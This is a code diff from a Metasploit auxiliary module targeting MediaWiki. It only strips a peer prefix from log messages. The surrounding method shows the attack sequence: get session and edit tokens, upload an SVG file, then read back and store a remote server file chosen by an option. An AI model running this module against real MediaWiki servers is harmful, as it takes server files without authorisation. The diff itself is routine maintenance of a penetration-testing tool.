@@ -211,58 +211,58 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def accessfile(rhost)
-    vprint_status("#{peer} MediaWiki - Getting unauthenticated session...")
+    vprint_status("MediaWiki - Getting unauthenticated session...")
     @wiki_session_name, @wiki_session = get_first_session
     if @wiki_session.nil?
-      print_error("#{peer} MediaWiki - Failed to get unauthenticated session...")
+      print_error("MediaWiki - Failed to get unauthenticated session...")
       return
     end
-    vprint_status("#{peer} Sessioncookie: #{@wiki_session_name}=#{@wiki_session}")
+    vprint_status("Sessioncookie: #{@wiki_session_name}=#{@wiki_session}")
 
     if @user and not @user.empty? and @password and not @password.empty?
-      vprint_status("#{peer} MediaWiki - Getting login token...")
+      vprint_status("MediaWiki - Getting login token...")
       @login_token = get_login_token
       if @login_token.nil?
-        print_error("#{peer} MediaWiki - Failed to get login token")
+        print_error("MediaWiki - Failed to get login token")
         return
       end
-      vprint_status("#{peer} Logintoken: #{@login_token}")
+      vprint_status("Logintoken: #{@login_token}")
 
       if not authenticate
-        print_error("#{peer} MediaWiki - Failed to authenticate")
+        print_error("MediaWiki - Failed to authenticate")
         return
       end
-      vprint_status("#{peer} Userid cookie: #{@wiki_user_id_name}=#{@wiki_user_id}")
-      vprint_status("#{peer} Username cookie: #{@wiki_user_name_name}=#{@wiki_user_name}")
-      vprint_status("#{peer} Session cookie: #{@wiki_session_name}=#{@wiki_session}")
+      vprint_status("Userid cookie: #{@wiki_user_id_name}=#{@wiki_user_id}")
+      vprint_status("Username cookie: #{@wiki_user_name_name}=#{@wiki_user_name}")
+      vprint_status("Session cookie: #{@wiki_session_name}=#{@wiki_session}")
     end
 
-    vprint_status("#{peer} MediaWiki - Getting edit token...")
+    vprint_status("MediaWiki - Getting edit token...")
     @edit_token = get_edit_token
     if @edit_token.nil?
-      print_error("#{peer} MediaWiki - Failed to get edit token")
+      print_error("MediaWiki - Failed to get edit token")
       return
     end
-    vprint_status("#{peer} Edittoken: #{@edit_token}")
+    vprint_status("Edittoken: #{@edit_token}")
 
-    vprint_status("#{peer} MediaWiki - Uploading SVG file...")
+    vprint_status("MediaWiki - Uploading SVG file...")
     @svg_uri = upload_file
     if @svg_uri.nil?
-      print_error("#{peer} MediaWiki - Failed to upload SVG file")
+      print_error("MediaWiki - Failed to upload SVG file")
       return
     end
-    vprint_status("#{peer} SVG URI: #{@svg_uri}")
+    vprint_status("SVG URI: #{@svg_uri}")
 
-    vprint_status("#{peer} MediaWiki - Retrieving remote file...")
+    vprint_status("MediaWiki - Retrieving remote file...")
     loot = read_data
     if loot.nil? or loot.empty?
-      print_error("#{peer} MediaWiki - Failed to retrieve remote file")
+      print_error("MediaWiki - Failed to retrieve remote file")
       return
     end
 
     f = ::File.basename(datastore['RFILE'])
     path = store_loot('mediawiki.file', 'application/octet-stream', rhost, loot, f, datastore['RFILE'])
-    print_good("#{peer} MediaWiki - #{datastore['RFILE']} saved in #{path}")
+    print_good("MediaWiki - #{datastore['RFILE']} saved in #{path}")
   end
 
   def run
